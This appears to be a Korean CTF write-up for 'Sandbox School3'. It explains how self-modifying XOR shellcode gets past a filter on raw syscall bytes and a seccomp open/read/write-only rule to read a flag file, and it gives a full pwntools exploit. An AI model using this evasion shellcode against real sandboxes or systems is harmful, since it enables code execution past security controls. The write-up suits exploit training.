---
title: "2018 TenDollar CTF Sandbox School3"
date: 2020-2-13
ctf: TenDollar CTF
layout: post
---

`Sandbox School2` 이랑 다른점은 0xf,0x5를 필터링해서 syscall을 직접적으로 호출 할 수 없게되었다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  signed int i; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL);
  if ( buf == -1LL )
  {
    puts("[err] Please, let me know this issue (hackability@naver.com)");
    result = -1;
  }
  else
  {
    puts("[*] Welcome to sandbox school for beginner!");
    puts("[*] Put your shellcode as binary stream. I'll ready for your input as read(0, shellcode, 1024)");
    puts("[*] Lv   : Orc");
    puts("[*] Desc : You can't go futher.");
    printf("> ", 4096LL);
    alarm(10u);
    read(0, buf, 1024uLL);
    for ( i = 0; i <= 1022; ++i )
    {
      if ( *(buf + i) == 0xF && *(buf + i + 1) == 5 )
      {
        puts("[*] blocked !");
        return -1;
      }
    }
    install_syscall_filter();
    (buf)(0LL, buf);
    result = 0;
  }
  return result;
}
```

ORW만 사용할 수 있다.

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

`\x0f\x05` syscall을 직접적으로 사용할 수 없으니까 xor을 이용해서 syscall으로 간접적으로 변경해주면 된다.

```
>>> hex(0x9f95^0x9090)
'0x0f05'
```

rip를 참조해서 `\x90\x90` nop을 syscall로 변경해주면 된다. xor 값을 넣은 땐 리틀엔디안으로 넣어주면 된다.

> exploit.py

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
e = ELF('./sb3')
p = process('./sb3')

s='''
mov rax, 2
mov rdi, rsp
mov rsi, 0
mov rdx, 0
xor word ptr[rip], 0x959f
nop
nop

add rsp, 1000

mov rdi, rax
mov rax, 0
mov rsi, rsp
mov rdx, 50
xor word ptr[rip], 0x959f
nop
nop

mov rax, 1
mov rdi, 1
mov rsi, rsp
mov rdx, 50
xor word ptr[rip], 0x959f
nop
nop
'''

# raw_input()
p.send(asm(shellcraft.pushstr('./flag'))+asm(s))

p.interactive()
```

